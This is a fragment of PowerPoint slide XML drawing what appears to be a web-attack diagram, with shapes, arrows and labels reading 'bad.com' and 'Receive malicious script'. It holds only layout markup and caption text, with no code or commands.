        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165902" name="object 14"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165903" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165904" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165905" name="object 19"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7304835" y="4549588"/>
            <a:ext cx="232522" cy="200306"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 249 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 1263 h 284479"/>
              <a:gd name="T4" fmla="*/ 765 w 339725"/>
              <a:gd name="T5" fmla="*/ 1124 h 284479"/>
              <a:gd name="T6" fmla="*/ 249 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="110566" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="284048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339318" y="252590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11056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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165906" name="object 25"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4041122" y="3808600"/>
            <a:ext cx="231121" cy="200305"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 662 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 137 h 284479"/>
              <a:gd name="T4" fmla="*/ 445 w 339725"/>
              <a:gd name="T5" fmla="*/ 1262 h 284479"/>
              <a:gd name="T6" fmla="*/ 662 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="339369" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="30962"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228396" y="283883"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33936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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4622427" y="4465580"/>
            <a:ext cx="3192276" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1918"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" baseline="1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Receive </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="11" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-72" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="52" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165908" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4441733" y="3667125"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 993 w 471170"/>
              <a:gd name="T1" fmla="*/ 643 h 471170"/>
              <a:gd name="T2" fmla="*/ 1024 w 471170"/>
              <a:gd name="T3" fmla="*/ 848 h 471170"/>
              <a:gd name="T4" fmla="*/ 1036 w 471170"/>
              <a:gd name="T5" fmla="*/ 1056 h 471170"/>
              <a:gd name="T6" fmla="*/ 1027 w 471170"/>
              <a:gd name="T7" fmla="*/ 1260 h 471170"/>
              <a:gd name="T8" fmla="*/ 999 w 471170"/>
              <a:gd name="T9" fmla="*/ 1456 h 471170"/>
              <a:gd name="T10" fmla="*/ 954 w 471170"/>
              <a:gd name="T11" fmla="*/ 1638 h 471170"/>
              <a:gd name="T12" fmla="*/ 893 w 471170"/>
              <a:gd name="T13" fmla="*/ 1799 h 471170"/>
              <a:gd name="T14" fmla="*/ 815 w 471170"/>
              <a:gd name="T15" fmla="*/ 1936 h 471170"/>
              <a:gd name="T16" fmla="*/ 723 w 471170"/>
              <a:gd name="T17" fmla="*/ 2040 h 471170"/>
              <a:gd name="T18" fmla="*/ 623 w 471170"/>
              <a:gd name="T19" fmla="*/ 2105 h 471170"/>
              <a:gd name="T20" fmla="*/ 522 w 471170"/>
              <a:gd name="T21" fmla="*/ 2127 h 471170"/>
              <a:gd name="T22" fmla="*/ 422 w 471170"/>
              <a:gd name="T23" fmla="*/ 2109 h 471170"/>
              <a:gd name="T24" fmla="*/ 327 w 471170"/>
              <a:gd name="T25" fmla="*/ 2051 h 471170"/>
              <a:gd name="T26" fmla="*/ 238 w 471170"/>
              <a:gd name="T27" fmla="*/ 1958 h 471170"/>
              <a:gd name="T28" fmla="*/ 160 w 471170"/>
              <a:gd name="T29" fmla="*/ 1831 h 471170"/>
              <a:gd name="T30" fmla="*/ 94 w 471170"/>
              <a:gd name="T31" fmla="*/ 1673 h 471170"/>
              <a:gd name="T32" fmla="*/ 43 w 471170"/>
              <a:gd name="T33" fmla="*/ 1484 h 471170"/>
              <a:gd name="T34" fmla="*/ 11 w 471170"/>
              <a:gd name="T35" fmla="*/ 1279 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1071 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 866 h 471170"/>
              <a:gd name="T40" fmla="*/ 36 w 471170"/>
              <a:gd name="T41" fmla="*/ 671 h 471170"/>
              <a:gd name="T42" fmla="*/ 82 w 471170"/>
              <a:gd name="T43" fmla="*/ 489 h 471170"/>
              <a:gd name="T44" fmla="*/ 143 w 471170"/>
              <a:gd name="T45" fmla="*/ 327 h 471170"/>
              <a:gd name="T46" fmla="*/ 221 w 471170"/>
              <a:gd name="T47" fmla="*/ 192 h 471170"/>
              <a:gd name="T48" fmla="*/ 313 w 471170"/>
              <a:gd name="T49" fmla="*/ 87 h 471170"/>
              <a:gd name="T50" fmla="*/ 412 w 471170"/>
              <a:gd name="T51" fmla="*/ 22 h 471170"/>
              <a:gd name="T52" fmla="*/ 514 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 614 w 471170"/>
              <a:gd name="T55" fmla="*/ 19 h 471170"/>
              <a:gd name="T56" fmla="*/ 709 w 471170"/>
              <a:gd name="T57" fmla="*/ 75 h 471170"/>
              <a:gd name="T58" fmla="*/ 797 w 471170"/>
              <a:gd name="T59" fmla="*/ 168 h 471170"/>
              <a:gd name="T60" fmla="*/ 876 w 471170"/>
              <a:gd name="T61" fmla="*/ 296 h 471170"/>
              <a:gd name="T62" fmla="*/ 942 w 471170"/>
              <a:gd name="T63" fmla="*/ 454 h 471170"/>
              <a:gd name="T64" fmla="*/ 993 w 471170"/>
              <a:gd name="T65" fmla="*/ 643 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="451630" y="142261"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="466021" y="187720"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470920" y="233728"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466820" y="279041"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454217" y="322414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="433605" y="362603"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="405478" y="398365"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="370331" y="428456"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="328659" y="451630"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="283199" y="466021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="237191" y="470920"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191879" y="466820"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148505" y="454217"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108316" y="433605"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72554" y="405478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42464" y="370331"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19289" y="328659"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4898" y="283199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="237191"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4099" y="191879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16702" y="148506"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37315" y="108316"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65441" y="72554"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100588" y="42464"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142261" y="19289"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="187720" y="4898"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="233728" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279040" y="4099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322414" y="16702"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="362603" y="37315"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398365" y="65441"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="428456" y="100588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451630" y="142261"/>
                </a:lnTo>
